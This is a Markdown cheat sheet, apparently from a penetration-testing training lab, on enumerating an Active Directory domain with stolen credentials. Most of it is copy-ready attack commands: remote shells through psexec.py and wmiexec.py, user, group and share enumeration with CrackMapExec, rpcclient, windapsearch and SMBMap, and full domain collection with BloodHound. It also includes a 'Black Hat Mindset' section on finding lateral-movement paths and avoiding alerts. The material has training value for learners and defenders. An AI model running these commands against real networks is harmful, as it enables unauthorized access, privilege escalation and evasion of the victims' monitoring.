
# Active Directory Credential Enumeration

This README focuses on enumerating users, groups, shares, and permissions in an AD environment using compromised credentials to identify potential attack paths.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Connecting to the Target](#connecting-to-the-target)
- [Enumerating Users and Groups](#enumerating-users-and-groups)
- [Enumerating Shares and Permissions](#enumerating-shares-and-permissions)
- [Advanced Enumeration](#advanced-enumeration)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Credential enumeration in AD involves using compromised credentials to gather information about users, groups, shares, and permissions, often leading to privilege escalation or lateral movement. This guide uses CrackMapExec, SMBMap, Impacket, windapsearch, and BloodHound to enumerate the domain and identify weaknesses. Commands are performed from Linux hosts, assuming you have valid credentials (e.g., `forend:Klmcargo2`).

## Setup and Prerequisites

- **Environment**: Linux host for all tools.
- **CrackMapExec**: Install on Linux (e.g., `pip install crackmapexec`).
- **SMBMap**: Install on Linux (e.g., `apt install smbmap`).
- **Impacket**: Install on Linux (e.g., `pip install impacket`) for `psexec.py` and `wmiexec.py`.
- **windapsearch**: Download `windapsearch.py` (e.g., from its GitHub repo) and place in your working directory.
- **BloodHound**: Install the Python version on Linux (e.g., `pip install bloodhound`) and ensure Neo4j is set up for GUI analysis.
- **Credentials**: Use compromised domain credentials (e.g., `forend:Klmcargo2` or `wley:transporter@4`).
- **Network Access**: Ensure connectivity to the target domain controller or host (e.g., `172.16.5.5`).

## Connecting to the Target

Establish a connection to the target using valid credentials.

```bash
# Connect via RDP
xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25

# Connect via PsExec
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

# Connect via WMI
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

## Enumerating Users and Groups

Discover users, groups, and their relationships in the domain.

```bash
# Enumerate users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# Enumerate groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# List logged-on users
sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users

# Query specific user by RID
rpcclient -U "inlanefreight.local\forend%Klmcargo2" 172.16.5.5 -c "queryuser 0x457"

# Enumerate all domain users
rpcclient -U "inlanefreight.local\forend%Klmcargo2" 172.16.5.5 -c "enumdomusers"

# Enumerate Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\forend -p Klmcargo2 --da

# Search for nested permissions
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\forend -p Klmcargo2 -PU
```

## Enumerating Shares and Permissions

Identify accessible shares and their contents for potential data leakage or privilege escalation.

```bash
# Discover SMB shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Spider a specific share
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share

# Enumerate shares and permissions
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# List directories in SYSVOL
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
```

## Advanced Enumeration

Use BloodHound for comprehensive domain mapping.

```bash
# Collect all domain data with BloodHound
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

## Black Hat Mindset

- **Map Thoroughly**: Enumerate users, groups, and shares to identify high-value targets (e.g., Domain Admins, sensitive shares).
- **Exploit Access**: Use logged-on users and share permissions to find opportunities for lateral movement.
- **Stay Silent**: Minimize interactions with the target to avoid triggering alerts (e.g., use `--dir-only` to reduce noise).
- **Visualize Attacks**: Leverage BloodHound to find the shortest path to domain dominance.

## Resources

- [CrackMapExec Guide](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
- [SMBMap Documentation](https://github.com/ShawnDEvans/smbmap)
- [Impacket Guide](https://github.com/SecureAuthCorp/impacket)
- [windapsearch GitHub](https://github.com/ropnop/windapsearch)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)

